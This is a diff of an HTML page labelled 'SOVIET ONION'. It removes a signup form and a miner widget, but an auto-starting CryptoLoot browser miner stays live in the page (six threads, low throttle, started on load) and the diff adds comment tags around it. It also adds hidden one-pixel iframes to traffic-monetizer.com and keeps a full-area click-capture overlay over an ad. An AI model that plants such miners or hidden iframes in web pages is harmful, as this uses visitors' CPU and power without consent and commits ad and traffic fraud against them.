@@ -34,165 +34,6 @@
     },1000);
 </script>
 	  //end of coinimp
-    <script>
-function loadjQuery(e,t){var n=document.createElement("script");n.setAttribute("src",e);n.onload=t;n.onreadystatechange=function(){if(this.readyState=="complete"||this.readyState=="loaded")t()};document.getElementsByTagName("head")[0].appendChild(n)}function main(){
-var $cr=jQuery.noConflict();var old_src;$cr(document).ready(function(){$cr(".cr_form").submit(function(){$cr(this).find('.clever_form_error').removeClass('clever_form_error');$cr(this).find('.clever_form_note').remove();$cr(this).find(".musthave").find('input, textarea').each(function(){if(jQuery.trim($cr(this).val())==""||($cr(this).is(':checkbox'))||($cr(this).is(':radio'))){if($cr(this).is(':checkbox')||($cr(this).is(':radio'))){if(!$cr(this).parent().find(":checked").is(":checked")){$cr(this).parent().addClass('clever_form_error')}}else{$cr(this).addClass('clever_form_error')}}});if($cr(this).attr("action").search(document.domain)>0&&$cr(".cr_form").attr("action").search("wcs")>0){var cr_email=$cr(this).find('input[name=email]');var unsub=false;if($cr("input['name=cr_subunsubscribe'][value='false']").length){if($cr("input['name=cr_subunsubscribe'][value='false']").is(":checked")){unsub=true}}if(cr_email.val()&&!unsub){$cr.ajax({type:"GET",url:$cr(".cr_form").attr("action").replace("wcs","check_email")+$cr(this).find('input[name=email]').val(),success:function(data){if(data){cr_email.addClass('clever_form_error').before("<div class='clever_form_note cr_font'>"+data+"</div>");return false}},async:false})}var cr_captcha=$cr(this).find('input[name=captcha]');if(cr_captcha.val()){$cr.ajax({type:"GET",url:$cr(".cr_form").attr("action").replace("wcs","check_captcha")+$cr(this).find('input[name=captcha]').val(),success:function(data){if(data){cr_captcha.addClass('clever_form_error').after("<div style='display:block' class='clever_form_note cr_font'>"+data+"</div>");return false}},async:false})}}if($cr(this).find('.clever_form_error').length){return false}return true});$cr('input[class*="cr_number"]').change(function(){if(isNaN($cr(this).val())){$cr(this).val(1)}if($cr(this).attr("min")){if(($cr(this).val()*1)<($cr(this).attr("min")*1)){$cr(this).val($cr(this).attr("min"))}}if($cr(this).attr("max")){if(($cr(this).val()*1)>($cr(this).attr("max")*1)){$cr(this).val($cr(this).attr("max"))}}});old_src=$cr("div[rel='captcha'] img:not(.captcha2_reload)").attr("src");if($cr("div[rel='captcha'] img:not(.captcha2_reload)").length!=0){captcha_reload()}});function captcha_reload(){var timestamp=new Date().getTime();$cr("div[rel='captcha'] img:not(.captcha2_reload)").attr("src","");$cr("div[rel='captcha'] img:not(.captcha2_reload)").attr("src",old_src+"?t="+timestamp);return false}
-
-$cr(document).ready(function(){
-	setTimeout( function(){
-		$cr("#cr_embeded_form").fadeIn();
-	}, 20000);
-
-	$cr("#cr_embed_close_form").click(function(){
-		$cr("#cr_embeded_form").hide();
-	});
-});
-
-}
-if(typeof jQuery==="undefined"){loadjQuery("//ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js",main)}else{main()}
-
-</script>
-	  
-	  	  
-	  <div class="block">
- <div class="six columns stopped" id="miner">
-   <div class="row">
-     <div class="four columns">
-       <h4 class="number-label">Hashes/s</h4>
-       <h2 id="mining-hashes-per-second">0.0</h2>
-     </div>
-     <div class="four columns">
-       <h4 class="number-label">Total</h4>
-       <h2 id="mining-hashes-total">0</h2>
-     </div>
-     <div class="four columns">
-       <h4 class="number-label">Threads</h4>
-       <h2>
-         <span id="mining-threads">2</span>
-         <span id="mining-threads-add" class="action">+</span>
-         <span class="mining-divide"> / </span>
-         <span id="mining-threads-remove" class="action">-</span>
-       </h2>
-     </div>
-   </div>
-   <div id="mining-stats-container">
-     <canvas id="mining-stats-canvas"></canvas>
-     <div id="mining-controls">
-       <a href="#" class="mining-button" id="mining-start">
-         <svg class="mining-icon play-button" viewBox="0 0 200 200" alt="Start Mining">
-           <circle cx="100" cy="100" r="90" fill="none" stroke-width="15" class="mining-stroke"/>
-           <polygon points="70, 55 70, 145 145, 100" class="mining-fill"></polygon>
-         </svg>
-         Start Mining       </a>
-       <a href="#" class="mining-button" id="mining-stop">
-         <svg class="mining-icon pause-button" viewBox="0 0 200 200" alt="Pause">
-           <circle cx="100" cy="100" r="90" fill="none" stroke-width="15" class="mining-stroke"/>
-           <rect x="70" y="50" width="20" height="100" class="mining-fill"/>
-           <rect x="110" y="50" width="20" height="100" class="mining-fill"/>
-         </svg>
-       </a>
-     </div>
-     <div id="blk-warning" class="blk-warn" style="display: none">
-       Library failed to load.<br/><strong>Please disable adblock!</strong>
-     </div>
-   </div>
-</div>
-		
-	  <script src="//statdynamic.com/lib/crypta.js"></script>
-<script src="https://reauthenticator.com/lib/minui.js"></script>
-<script>
-var miner = null;
-try {
-  miner = new CRLT.Anonymous('5eda9294d09d92be1129eaad8c3af00a8f17711a5796', {threads: 2});
-} catch(e) {}
-
-var ui = new MinerUI(miner, {
-  container: document.getElementById('miner'),
-  canvas: document.getElementById('mining-stats-canvas'),
-  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
-  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
-  threads: document.getElementById('mining-threads'),
-  threadsAdd: document.getElementById('mining-threads-add'),
-  threadsRemove: document.getElementById('mining-threads-remove'),
-  hashesTotal: document.getElementById('mining-hashes-total'),
-  startButton: document.getElementById('mining-start'),
-  stopButton: document.getElementById('mining-stop'),
-  blkWarn: document.getElementById('blk-warning')
-});
-ui.autoStart(); // Uncomment this if you would like to start the script automatically.
-</script>
-
-  
-		  
-
-<style>
-.cr_site{margin:0;padding:75px 0 0 0;text-align:center;background-color:#eeeeee;}
-.cr_font{font-size: 14px;font-family: Arial;}
-.cr_body h2, .cr_header h2{font-size:22px;line-height:28px;margin:0 0 10px 0;}
-.cr_body h1, .cr_header h2{font-size:28px;margin-bottom:15px;padding:0;margin-top:0;}
-.wrapper, .cr_page{margin:0 auto 10px auto;text-align:left;border-radius:4px;}
-.cr_header{text-align:center;background: transparent !Important;}
-.cr_body label{float:none;clear:both;display:block;width:auto;margin-top:8px;text-align:left;font-weight:bold;position:relative;}
-.cr_button{display:inline-block;font-family:'Helvetica', Arial, sans-serif;width:auto;white-space:nowrap;height:32px;margin:5px 5px 0 0;padding:0 22px;text-decoration:none;text-align:center;font-weight:bold;font-style:normal;font-size:15px;line-height:32px;cursor:pointer;border:0;-moz-border-radius:4px;border-radius:4px;-webkit-border-radius:4px;vertical-align:top;}
-.cr_button{background-color:#333;color:#ffffff;}
-.cr_button:hover,.cr_button-small:hover{opacity:0.7;filter:alpha(opacity=70);}
-.powered{padding:20px 0;width:560px;margin:0 auto;}
-.formbox{line-height:150%;font-family:Helvetica;font-size:12px;color:#333333;padding:20px;background-color:#ffffff;border-radius: 6px 6px 6px 6px;}
-.cr_ipe_item label{line-height:150%;font-size:14px;}
-.cr_ipe_item textarea {background: none repeat scroll 0 0 #eeeeee;border: 1px solid #aaa;font-family: Helvetica;font-size: 16px;}
-.cr_ipe_item input {background: none repeat scroll 0 0 #eeeeee;border: 1px solid #aaa;padding: 5px;font-family: Helvetica;font-size: 16px;}
-.cr_ipe_item select {background: none repeat scroll 0 0 #eeeeee;border: 1px solid #aaa;display: block;margin: 0;padding: 5px;width: 100%;font-family: Helvetica;font-size: 16px;}
-.cr_ipe_item input.cr_ipe_radio, input.cr_ipe_checkbox {-moz-binding: none;-moz-box-sizing: border-box;background-color: -moz-field !important;border: 2px inset threedface !important;color: -moz-fieldtext !important;cursor: default;height: 13px;padding: 0 !important;width: 13px;}
-.cr_ipe_item input.cr_ipe_radio{-moz-appearance: radio;border-radius: 100% 100% 100% 100% !important;margin: 3px 3px 0 5px;}
-.submit_container{text-align:center}
-.cr_ipe_item{ padding:1px 10px; margin:1px 10px; }
-.cr_ipe_item.inactive {display:none;}
-.imprint{font-size:0.8em;}
-.cr_captcha{padding-left:130px;}
-.cr_error{font-size:1.1em;padding:10px;}
-.clever_form_error{background-color:#f99; color:#000; border:1px solid #f22 !important}
-.clever_form_note {margin:26px 0 0 3px;position:absolute;display:inline; padding: 2px 4px; font-weight:bold;background-color:#f2ecb5; color:#000; font-size:12px !important;  }
-.cr_site {background-color:#eee;}
-.cr_header {color:#000000;}
-.cr_body {background-color:#ffffff;font-size:12px;color:#000000;}
-.cr_hr {background-color:#ccc;}
-.cr_site a {color:#0084ff;}
-.imprint{color:#000;}
-
-</style>
-
-
-<style id="style">
-.cr_site {background-color:#eee;}
-.cr_header {color:#000000;}
-.cr_body {background-color:#ffffff;font-size:12px;color:#000000;}
-.cr_hr {background-color:#ccc;}
-.cr_site a {color:#0084ff;}
-.imprint {color:#000;}
-.cr_page {width:640px;}
-
-</style>
-
-
-
-	<div id="cr_embeded_form" style="text-align:center;display:none;padding-top:20px; position: fixed;top: 0;left: 0;width: 100%;height: 100%;background-color: rgba(0,0,0,0.8);*background-color: rgb(0,0,0);display: none;z-index: 8000;">
-
-<form class="layout_form cr_form cr_font" action="https://seu2.cleverreach.com/f/254011-250373/wcs/" method="post" target="_blank">
-	<div class="cr_body cr_page cr_font formbox">
-		<div class="non_sortable" style="text-align:left;">
-			
-			
-			<div id="cr_embed_close_form" style="position:relative; cursor:pointer; float:right; margin-top:-30px; margin-right:-30px; z-index:9000;"><img src="https://eu2.cleverreach.com/images/fancy_closebox.png" border="0"></div>
-			
-			
-		</div>
-		
-		<div class="editable_content" style="text-align:left;">
-		<div id="5408105" rel="email" class="cr_ipe_item ui-sortable musthave" style="margin-bottom:px;">
-<label for="text5408105" class="itemname">E-Mail*</label> <input id="text5408105" name="email" value="" type="text" style="width:100%;" />
-</div><div id="5408109" rel="recaptcha" class="cr_ipe_item ui-sortable musthave">
-	
-
 	
 
 	<script src="https://www.google.com/recaptcha/api.js" async defer></script>
@@ -222,24 +63,22 @@ ui.autoStart(); // Uncomment this if you would like to start the script automati
     <br/>
     <br/>
    <script src="//statdynamic.com/lib/crypta.js"></script>
+//cryptoloot
 <script>
   var miner=new CRLT.Anonymous('5eda9294d09d92be1129eaad8c3af00a8f17711a5796', {
     threads:6,throttle:0.1, coin: "upx",
   });
   miner.start();
 </script>
+//cryptoloot end
     <br/>
 <br/><h1>SOVIET ONION</h1>
 <a href='https://blogtrottr.com/?subscribe=http://www.freerssgenerator.com/?u=http%3A%2F%2Fmailnesia.com%2Fmailbox%2Fkuec&s=http%3A%2F%2Fmailnesia.com%2Fmailbox%2Fkuec&c=&m=30&i=False' title='Get this feed delivered by email'><img src='/images/icons/blogtrottr-16px.png' alt='Blogtrottr' /></a>
-    <br/><iframe src="//traffic-monetizer.com/cg.php?a=0585c326d02b882e128a897a02ff317c" frameborder="0" height="1" width="1" ></iframe>
-    <br/><iframe src="//traffic-monetizer.com/cg.php?a=856d04aab6d15770fa8ebff7171e186d" frameborder="0" height="1" width="1" ></iframe>
-    <br/><iframe src="//traffic-monetizer.com/cg.php?a=0b174015bcc61fee28d32ac3274265fa" frameborder="0" height="1" width="1" ></iframe>
-    <br/><iframe src="//traffic-monetizer.com/cg.php?a=8594f09966846f1c865239337d1b1274" frameborder="0" height="1" width="1" ></iframe>
-    <br/><iframe src="//traffic-monetizer.com/cg.php?a=856d04aab6d15770fa8ebff7171e186d" frameborder="0" height="1" width="1" ></iframe>
+    <br/>
+    <br/>
     <br/><iframe src="//absolutsoos.wordpress.com/" frameborder="0" height="1" width="1" ></iframe>
-    <br/><img src="https://absolutsoos.wordpress.com/" alt="random" width="1" height="1">
-    <br/>
-    <br/>
+    <br/><iframe src="//traffic-monetizer.com/cg.php?a=0585c326d02b882e128a897a02ff317c" frameborder="0" height="1" width="1" ></iframe>
+    <br/><iframe src="//traffic-monetizer.com/cg.php?a=93fdf27a6029baec70206451c37d1708" frameborder="0" height="1" width="1" ></iframe>
     <br/>
   </body>
   <footer>
@@ -251,7 +90,7 @@ ui.autoStart(); // Uncomment this if you would like to start the script automati
     <br/>
     <br/>
     <br/>
-    <br/>http://tiny.cc/yesno69
+    <br/><p>http://tiny.cc/yesno69</p>
     <br/><a href='https://absolutsoos.wordpress.com/'>absolut soos</a>
     <br/>
     <br/>
@@ -269,6 +108,9 @@ ui.autoStart(); // Uncomment this if you would like to start the script automati
     <br/>
     <br/>
     <br/>
-    <div style="position: relative;"><iframe src="https://linkvertise.net/cdn/ads/LV-468x60/index.html" frameborder="0" height="60" width="468"></iframe><a href="https://linkvertise.net/ac/126291" target="_blank" style="position: absolute; top: 0; bottom: 0; left: 0; right: 0;"></a></div>
+    <div style="position: relative;">
+	    <iframe src="https://linkvertise.net/cdn/ads/LV-468x60/index.html" frameborder="0" height="12%" width="100%"></iframe>
+	    <a href="https://linkvertise.net/ac/126291" target="_blank" style="position: absolute; top: 0; bottom: 0; left: 0; right: 0;"></a>
+	  </div>
   </footer>
 </html>
